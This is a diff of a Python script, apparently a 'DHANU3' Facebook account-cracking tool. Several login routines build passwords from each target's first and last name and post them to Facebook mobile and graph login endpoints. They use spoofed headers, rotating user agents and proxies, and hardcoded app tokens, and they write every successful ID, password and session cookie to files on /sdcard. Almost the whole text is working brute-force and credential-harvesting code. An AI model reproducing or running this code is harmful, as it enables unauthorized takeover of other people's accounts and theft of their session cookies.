-                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':DHANU, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start];q=0.8,application/signed-exchange;v=b3;q=0.7','sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
-                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aws=session.cookies.get_dict().keys()
-                        if "c_user" in Aws:
-                                coki=session.cookies.get_dict()
-                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\033[96;1 [DHANU-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/DHANU-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DHANU-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
-                              
-                                oks.append(ids)
-                                break
-                        elif 'checkpoint' in Aws:
-                                if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [DHANU-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/DHANU-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        cps.append(ids)
-                                        break
-                                else:
-                                        break
-                        else:
-                                continue
-        except requests.exceptions.ConnectionError:
-                time.sleep(20)
+            last = names.split(' ')[1]
+        except:
+            last = 'Khan'
+        ps = first.lower()
+        ps2 = last.lower()
+        for fikr in passlist:
+            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+            pro = random.choice(ugen+ugen2+ugen3+ugenn)
+            head = {'Host': 'x.facebook.com','method':'POST','path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100','scheme':'https','accept': '*/*','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','origin': 'https://mbasic.facebook.com','referer': 'https://m.facebook.com/','sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-asbd-id': '198387','x-fb-lsd': 'AVoPmsopEAk','user-agent': pro,}
+            getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+            idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
+            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
+            str(getlog.text)).group(1),"uid":ids,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+            complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+            kami=session.cookies.get_dict().keys()
+            if "c_user" in kami:
+                coki=session.cookies.get_dict()
+                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                print('\r\r\033[1;32m[DHANU3-OK] %s | %s'%(ids,pas))
+                open('/sdcard/DHANU3-OK/OK-M1_Cookies.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
+                open('/sdcard/DHANU3-OK/OK-M1.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/DHANU3-OK/OK-MIX.txt','a').write(ids+'|'+pas+'\n')
+                oks.append(ids)
+                break
+            elif 'checkpoint' in kami:
+                if 'y' in pcp:
+                    print('\r\r\33[1;31m[DHANU3-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open('/sdcard/DHANU3-CP/CP-M1.txt', 'a').write(ids+'|'+pas+'\n')
+                    cps.append(ids)
+                    break
+                else:
+                    break
+            else:
+                continue
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    loop+=1
+
+
+def ffbG(ids,names,passlist):
+		try:
+				global oks,cps,loop
+				sys.stdout.write(f"\r\r\033[1;37m[DHANU3-M2] {G}%s{W}|{G}OK{W}:-{G}%s{W}"%(loop,len(oks)));sys.stdout.flush()
+				fn = names.split(' ')[0]
+				try:
+						ln = names.split(' ')[1]
+				except:
+						ln = fn
+				for pw in passlist:					
+						pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+						data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code3,'client_country_code': loc3,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+						ua = randBuildvsskj()
+						headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent':randBuildvsskj(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
+						url = 'https://b-graph.facebook.com/auth/login'
+						po = requests.post(url,data=data,headers=headers).json()
+						if 'session_key' in po:
+										print(f'\r\r{G}[DHANU3-OK] '+ids+' | '+pas+'\033[1;97m')
+										coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+										ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+										cookies = f"sb={ssbb};{coki}"										 
+										open('/sdcard/DHANU3-OK/OK-M2_Cookies.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+										open('/sdcard/DHANU3-OK/OK-M2.txt','a').write(ids+'|'+pas+'\n')
+										open('/sdcard/DHANU3-OK/OK-MIX.txt','a').write(ids+'|'+pas+'\n')
+										oks.append(ids)
+										break
+						elif 'www.facebook.com' in po['error']['message']:
+										if 'y' in pcp:
+												print(f'\r\r{R}[DHANU3-CP] '+ids+' | '+pas+'\033[1;97m')
+												open('/sdcard/DHANU3-CP/CP-M2.txt','a').write(ids+'|'+pas+'\n')
+												cps.append(ids)
+												break
+						else:
+										continue
+				loop+=1
+		except requests.exceptions.ConnectionError:
+			time.sleep(20)
+		except Exception as e:
+			time.sleep(20)
+
+
+def ffbG1(ids,names,passlist):
+		try:
+				global oks,cps,loop
+				sys.stdout.write(f"\r\r\033[1;37m[DHANU3-M3] {G}%s{W}|{G}OK{W}:-{G}%s{W}"%(loop,len(oks)));sys.stdout.flush()
+				fn = names.split(' ')[0]
+				try:
+						ln = names.split(' ')[1]
+				except:
+						ln = fn
+				for pw in passlist:					
+						pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+						data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code3,'client_country_code': loc3,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+						ua = web()
+						headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent':randBuildvsskj(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
+						url = 'https://b-graph.facebook.com/auth/login'
+						po = requests.post(url,data=data,headers=headers).json()
+						if 'session_key' in po:
+										print(f'\r\r{G}[DHANU3-OK] '+ids+' | '+pas+'\033[1;97m')
+										coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+										ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+										cookies = f"sb={ssbb};{coki}"										 
+										open('/sdcard/DHANU3-OK/OK-M3_Cookies.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+										open('/sdcard/DHANU3-OK/OK-M3.txt','a').write(ids+'|'+pas+'\n')
+										open('/sdcard/DHANU3-OK/OK-MIX.txt','a').write(ids+'|'+pas+'\n')
+										oks.append(ids)
+										break
+						elif 'www.facebook.com' in po['error']['message']:
+										if 'y' in pcp:
+												print(f'\r\r{R}[DHANU3-CP] '+ids+' | '+pas+'\033[1;97m')
+												open('/sdcard/DHANU3-CP/CP-M3.txt','a').write(ids+'|'+pas+'\n')
+												cps.append(ids)
+												break
+						else:
+										continue
+				loop+=1
+		except requests.exceptions.ConnectionError:
+			time.sleep(20)
+		except Exception as e:
+			time.sleep(20)
+
+def mumitx(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(proxy)
+            session = requests.Session()
+            free_fb = session.get('https://p.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'x.facebook.com',
+    'method':'POST',
+    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+    'scheme':'https',
+    'accept': '*/*',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://mbasic.facebook.com',
+    'referer': 'https://m.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'x-asbd-id': '198387',
+    'x-fb-lsd': 'AVoPmsopEAk',
+    'user-agent': pro}
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[151:166]
+                print('\r\r\033[1;32m[DHANU3-OK] ' +cid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/DHANU3/DHANU3-RDM_OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/DHANU3-OK/DHANU3-RDM_Cookie.txt', 'a').write( cid+' | '+ps+'|'+cokies+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[141:156]
+                if 'y' in cp_cpx: 
+                 print('\r\r\033[1;31m[DHANU3-CP] ' +cid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/DHANU3-CP/DHANU3-RDM_CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
         loop+=1
-#═══════════FILE MERHOD 01═════════#
-def api1(ids,names,passlist):
-	try:
-		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
-		fn = names.split(' ')[0]
-		try:
-			ln = names.split(' ')[1]
-		except:
-			ln = fn
-		for pw in passlist:
-			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			head = {'User-Agent':DHANU(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
-			if 'session_key' in po:
-				uid = str(po['uid'])
-				print('\r\r\033[1;32m [DHANU-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
-				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-				cookies = f"sb={ssbb};{ckkk}"
-				print('\033[1;93m [ðŸ©] Cookies :- '+cookies)
-				line()
-				open('/sdcard/DHANU-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
-				oks.append(uid)
-				break
-			elif 'www.facebook.com' in po['error']['message']:
-				uid = str(po['error']['error_data']['uid'])
-				print(f'\r\r\033[1;91m [DHANU-CP] '+uid+' | '+pas+'\033[1;91m')
-				open('/sdcard/DHANU-CP.txt','a').write(uid+'|'+pas+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		pass
-#═════════FILE MERHOD 02═════════#
-def newidx(ids,names,passlist):
-	try:
-		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
-		fn = names.split(' ')[0]
-		try:
-			ln = names.split(' ')[1]
-		except:
-			ln = fn
-		for pw in passlist:
-			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			head = {"User-Agent": DHANU(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
-			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
-			if 'session_key' in po:
-				uid = str(po['uid'])
-				print('\r\r\033[1;32m [DHANU-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
-				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-				cookies = f"sb={ssbb};{ckkk}"
-				print('\033[1;93m [ðŸ©] Cookies :- '+cookies)
-				line()
-				open('/sdcard/DHANU-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
-				oks.append(uid)
-				break
-			elif 'www.facebook.com' in po['error']['message']:
-				uid = str(po['error']['error_data']['uid'])
-				print(f'\r\r\033[1;91m [DHANU-CP] '+uid+' | '+pas+'\033[1;91m')
-				open('/sdcard/DHANU-CP.txt','a').write(uid+'|'+pas+'\n')
-				cps.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		pass
-menu()
+        sys.stdout.write(f"\r[\033[1;97mDHANU3\033[1;97m] {G}%s{W}|{G}OK {W}:- {G}{(len(oks))} \r"%(loop)),
+        sys.stdout.flush()
+    except:
+        pass
+DHANU3()
